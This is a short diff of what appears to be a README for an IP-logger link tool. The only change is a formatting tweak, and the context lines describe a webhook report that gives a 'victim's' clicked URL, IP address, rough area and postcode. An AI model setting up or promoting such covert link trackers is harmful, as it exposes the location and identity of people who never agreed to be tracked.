@@ -17,7 +17,7 @@ https://submits.github.io/?111111111111111111?000000000000000000?5GQxDgWlCxxIgKq
 ![Clicking on the link should produce this from your webhook.](https://i.imgur.com/jUfUiGx.png)
 
 The webhook name will be randomised to avoid clutter, and the embed will contain the following:
-• The URL the victim clicked \n
+• The URL the victim clicked  <br>
 • IP
 • Rough Area 
 • Postcode
